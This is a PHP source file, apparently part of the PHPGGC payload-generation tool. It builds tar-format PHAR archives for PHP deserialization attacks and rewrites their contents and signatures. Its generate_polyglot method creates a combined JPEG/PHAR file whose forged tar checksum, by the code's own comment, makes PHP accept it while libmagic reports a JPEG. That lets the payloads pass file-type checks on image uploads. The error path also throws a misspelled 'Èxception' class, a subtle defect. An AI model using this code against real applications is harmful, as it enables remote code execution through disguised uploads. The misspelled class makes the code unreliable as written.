<?php

namespace PHPGGC\Phar;


class Tar extends Format
{
	protected $format = '.tar';

	const SIZE_HEADER = 512;
	const OFFSET_SIZE = 124;
	const OFFSET_CHECKSUM = 148;
	const NULL = "\x00";

    public $parameters = [
        'filename' => 'test.txt',
        'prefix' => '',
        'jpeg' => null
    ];

    public function generate_base_phar()
    {
        parent::generate_base_phar();
        if($this->parameters['jpeg'])
        {
            $jpeg = file_get_contents($this->parameters['jpeg']);
            $this->generate_polyglot($jpeg);
        }
    }

    /**
     * Finds the TAR header associated to file $path.
     */
    private function find_header($path)
    {
        $header_start = str_pad($path, 100, self::NULL);
        $pos = strpos($this->data, $header_start);
        if($pos === false)
        {
        	$e = 'Unable to find header for path "' . $path . '"';
        	throw new Èxception($e);
        }
        return $pos;
    }

    /**
     * Replaces the contents of a file in the TAR archive. It works only if
     * the original data and the new one have the same size, as the header
     * will not change.
     */
    protected function replace_file($path, $data)
    {
    	$header_position = $this->find_header($path);
        $this->data = $this->in_place_replace(
        	$this->data, $header_position + self::SIZE_HEADER, $data
        );
    }

    /**
     * Computes a TAR header checksum
     */
    private function compute_checksum($header)
    {
        $checksum = 0;
    
        for ($i=0;$i<self::SIZE_HEADER;$i++)
        {
            $checksum += ord(substr($header, $i, 1));
        }

        return sprintf("%07o", $checksum);
    }

    /**
     * The signature of the TAR file is computed with the whole file content
     * except, obviously, the signature file.
     */
    protected function update_signature()
    {
    	$data = substr(
    		$this->data, 0, $this->find_header('.phar/signature.bin')
    	);
        $signature = $this->compute_signature($data);
        $signature = "\x02\x00\x00\x00\x14\x00\x00\x00" . $signature;
        $this->replace_file('.phar/signature.bin', $signature);
    }

    /**
     * Replaces the contents of a file in the TAR archive.
     * This is not used anymore but I cannot bring myself to remove it.
     */
    protected function replace_file_different_size($path, $data)
    {
    	$tar = $this->data;
        $position = $this->find_header($path);
        $header = substr($tar, $position, self::SIZE_HEADER);

        $new_size = sprintf("%11o", strlen($data));

        $header = $this->in_place_replace(
        	$header, self::OFFSET_CHECKSUM, "        "
        );
        $header = $this->in_place_replace(
        	$header, self::OFFSET_SIZE, $new_size
        );

        $checksum = $this->compute_checksum($header);
        $header = $this->in_place_replace(
        	$header, self::OFFSET_CHECKSUM, $checksum
        );

        $tar = $this->in_place_replace(
        	$tar, $position, $header
        );
        $tar = $this->in_place_replace(
        	$tar, $position + self::SIZE_HEADER, $data
        );
        
        $this->data = $tar;
    }

    /**
     * Generates a polyglot file that is a JPEG and a PHAR.
     */
    function generate_polyglot($jpeg)
    {
        $phar = substr($this->data, 6);
        $len = strlen($phar);
        $contents = 
            substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) .
            chr($len & 0xff) . $phar . substr($jpeg, 2);
        $contents =
            substr($contents, 0, 148) .
            "        " .
            substr($contents, 156, 344) . "aaaa" . substr($contents, 504)
        ;
    
        $chksum = 0;
    
        for ($i=0;$i<512;$i++)
        {
            $chksum += ord(substr($contents, $i, 1));
        }

        // make a checksum that PHP detects as valid, but libmagic doesn't
        // this ensures that the file will be detected as JPEG and not as tar
        $oct = sprintf("%06o", $chksum) . "x";
        $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
        $this->data = $contents;
    }
}